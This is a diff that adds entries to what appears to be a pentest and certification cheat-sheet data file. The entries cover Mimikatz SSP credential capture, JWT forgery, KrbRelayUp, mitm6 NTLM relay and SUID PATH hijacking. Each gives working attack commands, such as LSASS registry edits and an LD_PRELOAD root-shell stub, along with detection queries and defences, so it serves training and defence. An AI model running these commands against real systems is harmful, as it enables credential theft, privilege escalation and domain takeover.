       "explain": "A short Python loop to brute-force a custom auth flow hydra/medusa cannot model:\n  for pin in range(10000)  iterate all 4-digit PINs\n  requests.get(f'http://<ip>:<port>/pin?pin={pin:04d}')   submit each candidate\nDetect success by status code, response length, or a keyword in the body. The variations show a POST dictionary attack; adapt for JSON, tokens, or multi-step flows."
+    },
+    {
+      "id": "ad-custom-ssp",
+      "name": "Custom SSP - Security Support Provider Persistence",
+      "command": "mimikatz # misc::memssp",
+      "description": "A Custom Security Support Provider (SSP) hooks into LSASS to capture plaintext credentials at every logon. mimilib.dll (shipped with Mimikatz) is the classic SSP that logs all credentials to C:\\Windows\\System32\\kiwissp.log. Can be installed via registry (survives reboot) or in-memory (fileless, lost on reboot).",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP persistence module; Mimikatz misc::memssp",
+      "tags": [
+        "ssp",
+        "security-support-provider",
+        "persistence",
+        "mimikatz",
+        "lsass",
+        "credential-capture",
+        "mimilib"
+      ],
+      "mitre": [
+        "T1547.005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nSSPs are DLLs that plug into LSASS and handle authentication.\nBy registering a custom SSP (like mimilib.dll), you capture\nall plaintext credentials at logon time.\n\n=== METHOD 1: In-Memory (fileless, lost on reboot) ===\n  mimikatz # privilege::debug\n  mimikatz # misc::memssp\n  # All future logons logged to C:\\Windows\\System32\\mimilsa.log\n  # No DLL on disk, no registry change\n\n=== METHOD 2: Registry Persistence (survives reboot) ===\n  # Copy mimilib.dll to System32\n  copy mimilib.dll C:\\Windows\\System32\\\n\n  # Add to SSP list in registry\n  reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f\n\n  # After reboot: credentials logged to C:\\Windows\\System32\\kiwissp.log\n\n=== METHOD 3: PowerShell (AddSecurityPackage API) ===\n  # Requires mimilib.dll in System32\n  $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"Security Packages\"\n  $packages.\"Security Packages\" += \"mimilib\"\n  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"Security Packages\" -Value $packages.\"Security Packages\"\n\n=== READ CAPTURED CREDS ===\n  type C:\\Windows\\System32\\kiwissp.log\n  type C:\\Windows\\System32\\mimilsa.log\n\n=== CLEANUP ===\n  # Remove from registry\n  # Delete mimilib.dll from System32\n  # Restart to unload from memory",
+      "examples": [
+        {
+          "label": "In-memory SSP (fileless)",
+          "command": "mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit"
+        },
+        {
+          "label": "Registry-based persistence",
+          "command": "copy mimilib.dll C:\\Windows\\System32\\ && reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f"
+        },
+        {
+          "label": "Read captured credentials",
+          "command": "type C:\\Windows\\System32\\kiwissp.log"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1547.005 - SSP",
+          "url": "https://attack.mitre.org/techniques/T1547/005/"
+        },
+        {
+          "title": "Mimikatz - misc::memssp",
+          "url": "https://github.com/gentilkiwi/mimikatz/wiki"
+        }
+      ],
+      "defense": {
+        "why_it_works": "LSASS loads all registered SSPs and calls their SpAcceptCredentials function on each logon, passing plaintext credentials. A malicious SSP simply logs these to a file.",
+        "prerequisites": "Local administrator or SYSTEM access on the target (to modify LSASS or registry).",
+        "impact": "All future logon credentials captured in plaintext - including domain admin and service accounts.",
+        "detection": "[MITRE T1547.005] Changes to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages; unknown DLLs loaded into lsass.exe; mimilib.dll or kiwissp.log on disk.",
+        "artifacts": "Registry modification (Event 4657); DLL loaded into LSASS (Sysmon Event 7); kiwissp.log or mimilsa.log file creation.",
+        "splunk_spl": "index=sysmon EventCode=7 Image=\"*lsass.exe\"\n| where NOT match(ImageLoaded, \"(msv1_0|kerberos|schannel|wdigest|tspkg|pku2u|cloudAP)\\.dll$\")\n| table _time, Image, ImageLoaded, Hashes",
+        "elastic_kql": "event.code:\"7\" AND process.name:\"lsass.exe\" AND NOT dll.name:(msv1_0.dll OR kerberos.dll OR schannel.dll OR wdigest.dll)",
+        "sentinel_kql": "SysmonEvent\n| where EventID == 7 and Image endswith \"lsass.exe\"\n| where ImageLoaded !contains \"msv1_0\" and ImageLoaded !contains \"kerberos\" and ImageLoaded !contains \"schannel\"\n| project TimeGenerated, Image, ImageLoaded, Hashes",
+        "sigma_rules": "sysmon_lsass_unknown_dll_load",
+        "prevention": "Monitor LSASS module loads (Sysmon Event 7); protect LSASS with Credential Guard; monitor LSA Security Packages registry key; restrict write access to System32.",
+        "sources": [
+          "CRTP persistence module",
+          "https://attack.mitre.org/techniques/T1547/005/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Custom SSP - Unknown DLL loaded into LSASS",
+            "logic": "SysmonEvent\n| where EventID == 7 and Image endswith \"lsass.exe\"\n| where ImageLoaded !has_any (\"msv1_0\",\"kerberos\",\"schannel\",\"wdigest\",\"tspkg\",\"pku2u\",\"cloudAP\",\"livessp\",\"negoexts\")\n| project TimeGenerated, Image, ImageLoaded, Hashes, SignatureStatus",
+            "data_source": "sysmon",
+            "log_ids": [
+              "7"
+            ],
+            "attack": [
+              "T1547.005"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Third-party SSPs (smart card, MFA providers)",
+            "tuning": "Whitelist known legitimate SSP DLLs; alert on unsigned DLLs"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -66659,6 +67314,105 @@ const COMMAND_DATA = {
       "explain": "Converts a password-protected file into a John-crackable hash:\n  ssh2john.py <file>       extract the hash from a protected artifact (SSH key here; office2john/pdf2john/zip2john for others)\n  > file.hash              save it\n  john --wordlist=/usr/share/wordlists/rockyou.txt file.hash   crack it\nReveal the recovered password with john --show; locate all helpers with 'locate *2john*'."
     },
     {
+      "id": "web-jwt-attacks",
+      "name": "JWT Attacks - Token Forgery and Key Confusion",
+      "command": "python3 jwt_tool.py <token> -T",
+      "description": "JWT (JSON Web Token) attacks exploit weak signing, algorithm confusion, or key management. Includes alg:none bypass, RS256-to-HS256 key confusion (sign with the public key as HMAC secret), weak HMAC secret cracking, JWK/JKU header injection, and kid path traversal. jwt_tool automates all these attacks.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Broken Authentication",
+      "certifications": [
+        "CWES",
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CWES",
+      "source": "ticarpi/jwt_tool; PortSwigger JWT research",
+      "tags": [
+        "jwt",
+        "json-web-token",
+        "authentication",
+        "token-forgery",
+        "algorithm-confusion",
+        "key-confusion"
+      ],
+      "mitre": [
+        "T1539",
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DECODE A TOKEN ===\n  python3 jwt_tool.py <token>\n  # or: echo '<token>' | base64 -d  (each part between dots)\n\n=== ALG:NONE BYPASS ===\n  python3 jwt_tool.py <token> -X a\n  # Sets algorithm to 'none', removes signature\n  # Works if server doesn't validate algorithm field\n\n=== KEY CONFUSION (RS256 -> HS256) ===\n  python3 jwt_tool.py <token> -X k -pk public_key.pem\n  # Changes algorithm from RS256 to HS256\n  # Signs with the public key as HMAC secret\n  # Works if server uses same key variable for both algorithms\n\n=== CRACK WEAK HMAC SECRET ===\n  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n  # or: john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt\n  # Then forge: python3 jwt_tool.py <token> -S hs256 -p 'cracked_secret'\n\n=== JWK HEADER INJECTION ===\n  python3 jwt_tool.py <token> -X i\n  # Injects attacker's JWK into the token header\n  # Server verifies against the embedded key instead of its own\n\n=== KID PATH TRAVERSAL ===\n  python3 jwt_tool.py <token> -I -hc kid -hv \"../../dev/null\" -S hs256 -p ''\n  # kid points to /dev/null (empty file), sign with empty secret\n  # or: kid = \"../../proc/sys/kernel/hostname\" and sign with hostname\n\n=== SCAN ALL ATTACKS ===\n  python3 jwt_tool.py <token> -M at -t http://<target>/api -rh \"Authorization: Bearer\"\n  # Runs all attack modes against a live endpoint\n\n=== COMMON JWT CLAIMS TO MODIFY ===\n  sub: change user identity\n  role: escalate to admin\n  exp: extend expiration\n  iss: change issuer",
+      "examples": [
+        {
+          "label": "Scan all JWT attacks",
+          "command": "python3 jwt_tool.py eyJhbGci... -M at -t http://target.htb/api -rh \"Authorization: Bearer\""
+        },
+        {
+          "label": "Algorithm none bypass",
+          "command": "python3 jwt_tool.py eyJhbGci... -X a"
+        },
+        {
+          "label": "Crack weak HMAC secret",
+          "command": "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Key confusion RS256 to HS256",
+          "command": "python3 jwt_tool.py eyJhbGci... -X k -pk public_key.pem"
+        }
+      ],
+      "references": [
+        {
+          "title": "jwt_tool - ticarpi",
+          "url": "https://github.com/ticarpi/jwt_tool"
+        },
+        {
+          "title": "PortSwigger - JWT Attacks",
+          "url": "https://portswigger.net/web-security/jwt"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "auth-session-token-forge",
+          "note": "General session token attacks; JWT is a specific token format.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "JWTs are self-contained tokens signed with a secret or key pair. Weak secrets, algorithm confusion, or improper validation let attackers forge tokens for any identity.",
+        "prerequisites": "Application using JWT for authentication; access to a valid token.",
+        "impact": "Authentication bypass, privilege escalation, identity impersonation.",
+        "detection": "[MITRE T1539] JWTs with alg:none, unexpected algorithm changes, or malformed headers; tokens with modified claims arriving at API endpoints.",
+        "artifacts": "HTTP logs with JWT tokens in Authorization headers; application logs showing auth failures or algorithm mismatches.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| rex field=request_header \"Authorization:\\s+Bearer\\s+(?<jwt>[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*)\"\n| where isnotnull(jwt)\n| eval header=base64decode(replace(mvindex(split(jwt,\".\"),0),\"[-_]\",\"+/\"))\n| where match(header, \"\\\"alg\\\":\\\"none\\\"\")\n| table _time, src_ip, uri_path",
+        "elastic_kql": "http.request.header:*Bearer* AND http.request.header:*eyJhbGciOiJub25l*",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery contains \"eyJhbGciOiJub25l\"\n| project TimeGenerated, cIP, csUriStem",
+        "sigma_rules": "web_jwt_alg_none_bypass",
+        "prevention": "Always validate algorithm server-side (whitelist allowed algorithms); use strong HMAC secrets (256-bit+); never trust alg from the token; use asymmetric keys (RS256/ES256) and keep private keys secure.",
+        "sources": [
+          "https://github.com/ticarpi/jwt_tool",
+          "https://portswigger.net/web-security/jwt"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "JWT Algorithm None Bypass Attempt",
+            "logic": "title: JWT alg:none Bypass Attempt\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri|contains: 'eyJhbGciOiJub25l'\n  condition: selection\nlevel: critical",
+            "data_source": "iis",
+            "attack": [
+              "T1539",
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Testing/development environments intentionally using unsigned tokens",
+            "tuning": "Any alg:none token in production is almost certainly malicious"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m06-kerberoasting",
       "name": "Kerberoasting - Attack, Detection & Defense",
       "command": ".\\Rubeus.exe kerberoast /outfile:spn.txt",
@@ -68948,6 +69702,108 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "The Kibana Query Language pattern for filtering Elastic SIEM events:\n  field:value              match a field to a value (e.g. event.code:4625)\n  AND field2:value2        both conditions must hold\n  NOT field3:value3        exclude matches of this condition\nUsed in Discover and dashboards to hunt events; wildcards (user.name: admin*) and @timestamp ranges narrow the hunt further."
+    },
+    {
+      "id": "ad-krbrelayup",
+      "name": "KrbRelayUp - Local Privilege Escalation via Kerberos Relay",
+      "command": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!",
+      "description": "KrbRelayUp chains LDAP signing abuse with RBCD or Shadow Credentials for local privilege escalation - all from a single unprivileged machine, no second box needed. Creates a machine account, sets RBCD on the target, then requests a service ticket to impersonate admin.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Dec0ne/KrbRelayUp; modern AD attack research",
+      "tags": [
+        "krbrelayup",
+        "kerberos-relay",
+        "rbcd",
+        "shadow-credentials",
+        "local-privesc",
+        "ldap-signing"
+      ],
+      "mitre": [
+        "T1557",
+        "T1550.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nKrbRelayUp abuses the lack of LDAP signing enforcement to relay\nKerberos auth from the local machine account to LDAP. It then sets\nRBCD or Shadow Credentials on the computer object, letting you\nimpersonate any user (e.g. administrator) to the local machine.\n\n=== RBCD METHOD (default) ===\n  KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!\n  KrbRelayUp.exe spawn -m rbcd -d corp.local -dc dc01.corp.local -cn YOURPC$ -cp Pass123!\n\n=== SHADOW CREDENTIALS METHOD ===\n  KrbRelayUp.exe relay -Domain corp.local -ShadowCredentials\n  KrbRelayUp.exe spawn -m shadowcred -d corp.local -dc dc01.corp.local\n\n=== FULL ATTACK MANUAL ===\n  # Step 1: Create machine account via relay\n  KrbRelayUp.exe relay -d corp.local -CreateNewComputerAccount -cn YOURPC$ -cp Pass123!\n  # Step 2: Request TGS with S4U2Self/S4U2Proxy\n  Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt\n  # Step 3: Use the ticket\n  dir \\\\target\\C$\n\n=== REQUIREMENTS ===\n- LDAP signing NOT enforced (default in most environments)\n- MachineAccountQuota >= 1 (or existing machine account credentials)\n- Domain controller reachable via LDAP",
+      "examples": [
+        {
+          "label": "RBCD relay and spawn",
+          "command": "KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!"
+        },
+        {
+          "label": "Shadow Credentials method",
+          "command": "KrbRelayUp.exe relay -Domain corp.local -ShadowCredentials"
+        },
+        {
+          "label": "Manual S4U chain after RBCD",
+          "command": "Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "KrbRelayUp - GitHub",
+          "url": "https://github.com/Dec0ne/KrbRelayUp"
+        },
+        {
+          "title": "LDAP Relay Attack Research",
+          "url": "https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-shadow-credentials",
+          "note": "Shadow Credentials is one of the two KrbRelayUp impersonation methods.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "RBCD is the default KrbRelayUp impersonation path.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When LDAP signing is not enforced, the local machine can relay its own Kerberos authentication to LDAP and modify its own computer object to add RBCD or Shadow Credentials.",
+        "prerequisites": "LDAP signing not enforced (default); MachineAccountQuota >= 1 or existing machine account.",
+        "impact": "Local privilege escalation to SYSTEM/Domain Admin without needing a second machine.",
+        "detection": "[MITRE T1557] New computer account creation + msDS-AllowedToActOnBehalfOfOtherIdentity modification on existing computer objects; suspicious S4U2Self/S4U2Proxy ticket requests.",
+        "artifacts": "Event 4741 (computer account created); Event 5136 (directory service changes); Event 4769 (Kerberos service ticket with S4U).",
+        "splunk_spl": "index=wineventlog EventCode=5136 AttributeLDAPDisplayName=\"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| table _time, SubjectUserName, ObjectDN, AttributeValue",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"msDS-AllowedToActOnBehalfOfOtherIdentity\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, SubjectUserName, ObjectDN",
+        "sigma_rules": "win_ad_rbcd_delegation_change",
+        "prevention": "Enforce LDAP signing (GPO: Domain controller: LDAP server signing requirements = Require signing); set MachineAccountQuota to 0; monitor RBCD/Shadow Credential changes.",
+        "sources": [
+          "https://github.com/Dec0ne/KrbRelayUp",
+          "https://attack.mitre.org/techniques/T1557/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "KrbRelayUp - RBCD delegation modification",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1557",
+              "T1550.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate RBCD configuration by admins",
+            "tuning": "Correlate with Event 4741 (new computer account) within same timeframe"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -89591,6 +90447,105 @@ const COMMAND_DATA = {
       "explain": "Lists scheduled tasks to find one whose target you can write:\n  schtasks /query          enumerate scheduled tasks\n  /fo LIST /v              full verbose list output (shows Run As User and the task action)\nA task run by a privileged account whose script/binary is writable by you is an escalation path - replace the target and wait for the trigger."
     },
     {
+      "id": "ad-mitm6-ipv6-takeover",
+      "name": "mitm6 - IPv6 DNS Takeover + NTLM Relay",
+      "command": "mitm6 -d <domain>",
+      "description": "mitm6 exploits the default IPv6 configuration in Windows to become the primary DNS server via DHCPv6 replies. Combined with ntlmrelayx, it captures NTLM authentication and relays it to LDAP/LDAPS to create machine accounts, set RBCD, or dump credentials.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Fox-IT/mitm6; modern relay attack chain",
+      "tags": [
+        "mitm6",
+        "ipv6",
+        "dhcpv6",
+        "ntlm-relay",
+        "dns-takeover",
+        "wpad",
+        "lateral-movement"
+      ],
+      "mitre": [
+        "T1557.001",
+        "T1557"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE CHAIN ===\n  # Terminal 1: Start mitm6 for DNS takeover\n  mitm6 -d corp.local\n\n  # Terminal 2: Start ntlmrelayx targeting LDAPS\n  ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh wpad.corp.local -l lootdir\n\n=== WHAT HAPPENS ===\n  1. mitm6 sends DHCPv6 replies to all Windows machines\n  2. Victims set attacker as their primary DNS server\n  3. Attacker replies to WPAD/DNS queries, triggering NTLM auth\n  4. ntlmrelayx relays the NTLM hash to LDAPS on the DC\n  5. If a privileged user authenticates: creates computer account + RBCD\n  6. If domain admin: can dump domain info directly\n\n=== NTLM RELAY TARGETS ===\n  # LDAPS (most common - create accounts, set ACLs)\n  ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh wpad.corp.local -l loot\n\n  # SMB (get shells)\n  ntlmrelayx.py -6 -t smb://<target> -wh wpad.corp.local -socks\n\n  # ADCS web enrollment (ESC8)\n  ntlmrelayx.py -6 -t http://<ca>/certsrv/certfnsh.asp -wh wpad.corp.local --adcs --template Machine\n\n=== LOOT ===\n  ls lootdir/   # domain users, groups, computers dumped as HTML\n  # If RBCD set: use getST.py to get admin ticket\n\n=== NOTES ===\n- Works in nearly every AD environment (IPv6 enabled by default)\n- Very loud - spams DHCPv6 to all machines\n- Run for 10-15 minutes, then stop\n- WPAD is the main trigger for NTLM auth",
+      "examples": [
+        {
+          "label": "Full mitm6 + ntlmrelayx chain",
+          "command": "sudo mitm6 -d corp.local"
+        },
+        {
+          "label": "Relay to LDAPS for RBCD",
+          "command": "ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local -l lootdir"
+        },
+        {
+          "label": "Relay to ADCS for ESC8",
+          "command": "ntlmrelayx.py -6 -t http://ca01.corp.local/certsrv/certfnsh.asp -wh wpad.corp.local --adcs --template Machine"
+        }
+      ],
+      "references": [
+        {
+          "title": "mitm6 - Fox-IT",
+          "url": "https://github.com/dirkjanm/mitm6"
+        },
+        {
+          "title": "The worst of both worlds - dirkjanm",
+          "url": "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-petitpotam",
+          "note": "PetitPotam is another authentication coercion method that feeds relay attacks.",
+          "rel": "alternative"
+        },
+        {
+          "id": "smb-ntlm-relay",
+          "note": "ntlmrelayx handles the relay side of the attack.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Windows prefers IPv6 over IPv4 and accepts DHCPv6 replies by default. When the attacker becomes the DNS server, they can reply to WPAD queries to trigger NTLM authentication, which gets relayed to LDAP.",
+        "prerequisites": "IPv6 enabled on target machines (default); LDAP signing not enforced; network access.",
+        "impact": "NTLM hash relay to LDAP for account creation, RBCD, or credential dumping. Can lead to full domain compromise.",
+        "detection": "[MITRE T1557.001] Unusual DHCPv6 traffic; new IPv6 DNS server configuration; WPAD requests to non-standard servers.",
+        "artifacts": "DHCPv6 Solicit/Advertise packets; DNS queries to rogue server; NTLM authentication to DC from unexpected source; Event 4741 (new computer account).",
+        "splunk_spl": "index=network sourcetype=dhcpv6\n| where message_type IN (\"Solicit\",\"Advertise\")\n| stats count by src_ip, dest_ip\n| where count > 50",
+        "elastic_kql": "network.protocol:\"dhcpv6\" AND dhcpv6.message_type:(\"Solicit\" OR \"Advertise\")",
+        "sentinel_kql": "CommonSecurityLog\n| where DeviceEventClassID contains \"DHCPv6\"\n| summarize Count=count() by SourceIP\n| where Count > 50",
+        "sigma_rules": "net_dhcpv6_mitm6_spoofing",
+        "prevention": "Disable DHCPv6 via GPO if not needed; enforce LDAP signing and channel binding; disable WPAD via GPO; enable EPA (Extended Protection for Authentication).",
+        "sources": [
+          "https://github.com/dirkjanm/mitm6",
+          "https://attack.mitre.org/techniques/T1557/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "mitm6 DHCPv6 spoofing detection",
+            "logic": "title: Suspicious DHCPv6 Rapid Responses (mitm6)\nstatus: experimental\nlogsource:\n  category: network\n  product: any\ndetection:\n  selection:\n    dst_port: 547\n  condition: selection | count() by src_ip > 50\nlevel: high",
+            "data_source": "network-flow",
+            "attack": [
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate DHCPv6 servers in dual-stack environments",
+            "tuning": "Whitelist known DHCPv6 server IPs"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -104988,6 +105943,91 @@ const COMMAND_DATA = {
       "explain": "Hijacks a command a privileged script calls by relative name:\n  PATH=.:${PATH}           prepend the current (writable) directory to PATH so it is searched first\nThen drop a malicious executable named exactly like the command the script invokes (e.g. touch ls; make it executable). When the privileged script runs, your binary executes instead of the real one."
     },
     {
+      "id": "linux-path-hijack",
+      "name": "PATH Hijacking - Exploit Relative Paths in SUID/Cron Scripts",
+      "command": "echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH",
+      "description": "PATH hijacking exploits scripts or SUID binaries that call system commands without full paths. If the script runs 'service apache restart' instead of '/usr/sbin/service apache restart', you can create a malicious 'service' binary in a directory earlier in PATH and it runs with the script's privileges.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Path & Wildcard Abuse",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Linux privilege escalation methodology",
+      "tags": [
+        "path-hijacking",
+        "privesc",
+        "linux",
+        "suid",
+        "relative-path",
+        "environment-variable"
+      ],
+      "mitre": [
+        "T1574.007"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== FIND TARGETS ===\n  # SUID binaries using relative paths\n  find / -perm -4000 -type f 2>/dev/null\n  # For each SUID binary, check what commands it calls:\n  strings /usr/local/bin/suid-binary | grep -E '^[a-z]'\n  ltrace /usr/local/bin/suid-binary 2>&1 | grep system\n  strace /usr/local/bin/suid-binary 2>&1 | grep exec\n\n  # Cron scripts using relative paths\n  cat /etc/crontab\n  ls /etc/cron.d/\n  # Look for scripts calling commands without full path\n\n=== EXPLOIT ===\n  # If SUID binary calls 'service' without full path:\n  echo '#!/bin/bash' > /tmp/service\n  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service\n  chmod +x /tmp/service\n  export PATH=/tmp:$PATH\n  /usr/local/bin/suid-binary\n  /tmp/rootbash -p  # root shell\n\n=== COMMON RELATIVE COMMANDS ===\n  service, curl, wget, python, php, cat, id, whoami, ifconfig, ip\n  # Any of these without a / prefix are exploitable\n\n=== ALSO CHECK ===\n  # Shared libraries (LD_PRELOAD/LD_LIBRARY_PATH)\n  # If SUID binary has env_keep for LD_PRELOAD:\n  echo '#include <stdio.h>\\nvoid _init() { setuid(0); system(\"/bin/bash -p\"); }' > /tmp/pe.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c\n  sudo LD_PRELOAD=/tmp/pe.so /usr/local/bin/suid-binary",
+      "examples": [
+        {
+          "label": "Create malicious binary and hijack PATH",
+          "command": "echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH"
+        },
+        {
+          "label": "Find SUID binaries with relative paths",
+          "command": "find / -perm -4000 -type f 2>/dev/null -exec strings {} \\; | grep -vE '^/' | sort -u"
+        },
+        {
+          "label": "Check what commands a SUID binary calls",
+          "command": "ltrace /usr/local/bin/suid-binary 2>&1 | grep -E '(system|exec|popen)'"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1574.007 - Path Interception",
+          "url": "https://attack.mitre.org/techniques/T1574/007/"
+        },
+        {
+          "title": "HackTricks - PATH Hijacking",
+          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When a binary calls system('service restart') without a full path, the OS searches $PATH directories in order. Prepending a writable directory with a malicious 'service' makes it execute first.",
+        "prerequisites": "SUID binary or privileged cron script using relative command paths; writable directory.",
+        "impact": "Privilege escalation to the owner of the SUID binary or cron job (often root).",
+        "detection": "[MITRE T1574.007] SUID binary executing unexpected child processes; PATH modifications in audit logs.",
+        "artifacts": "Process creation from SUID binary with unexpected child; modified PATH in environment.",
+        "splunk_spl": "index=linux sourcetype=linux:audit type=EXECVE\n| where match(a0, \"/tmp/|/dev/shm/|/var/tmp/\")\n| table _time, uid, euid, exe, a0, a1",
+        "elastic_kql": "process.executable:(/tmp/* OR /dev/shm/* OR /var/tmp/*) AND process.parent.executable:*suid*",
+        "sentinel_kql": "Syslog\n| where SyslogMessage contains \"EXECVE\" and (SyslogMessage contains \"/tmp/\" or SyslogMessage contains \"/dev/shm/\")\n| project TimeGenerated, Computer, SyslogMessage",
+        "sigma_rules": "lnx_path_hijacking_suid",
+        "prevention": "Always use full paths in scripts; remove unnecessary SUID bits; use secure_path in sudoers; mount /tmp with noexec.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1574/007/",
+          "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "SUID binary executing from writable directory",
+            "logic": "title: SUID Binary Child Process from Writable Directory\nstatus: experimental\nlogsource:\n  product: linux\n  service: auditd\ndetection:\n  selection:\n    type: EXECVE\n    a0|startswith:\n      - '/tmp/'\n      - '/dev/shm/'\n      - '/var/tmp/'\n  condition: selection\nlevel: high",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1574.007"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate scripts temporarily placed in /tmp",
+            "tuning": "Correlate with parent process being SUID; filter known good processes"
+          }
+        ]
+      }
+    },
+    {
       "id": "pcredz-pcap",
       "name": "Pcredz - Extract Credentials from Traffic",
       "command": "./Pcredz -f <pcap_file> -t -v",
@@ -109162,6 +110202,97 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Tests TCP connectivity to a port from Windows PowerShell:\n  Test-NetConnection   built-in connectivity test\n  -Port <port>         the TCP port to probe\n  <ip>                 the target\nReturns TcpTestSucceeded True/False plus the remote address - a quick no-tools port check from a foothold (aliased as tnc)."
+    },
+    {
+      "id": "ps-downgrade-attack",
+      "name": "PowerShell Downgrade Attack - Bypass Logging and AMSI",
+      "command": "powershell -version 2",
